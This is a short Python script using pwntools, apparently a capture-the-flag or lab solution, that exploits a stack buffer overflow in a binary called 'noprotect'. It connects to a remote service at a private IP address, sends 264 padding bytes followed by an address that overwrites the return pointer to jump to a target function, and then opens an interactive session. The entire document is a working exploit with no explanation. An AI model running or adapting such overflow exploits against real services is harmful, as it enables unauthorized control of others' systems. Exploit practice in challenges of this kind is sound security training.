from pwn import *

flags = 0x4011a6

# p = gdb.debug('./noprotect', '''
# b *0x40127a
# ''')

p = remote('10.10.10.15', 1005)

p.sendline(b'A'*264 + p64(flags))
p.interactive()

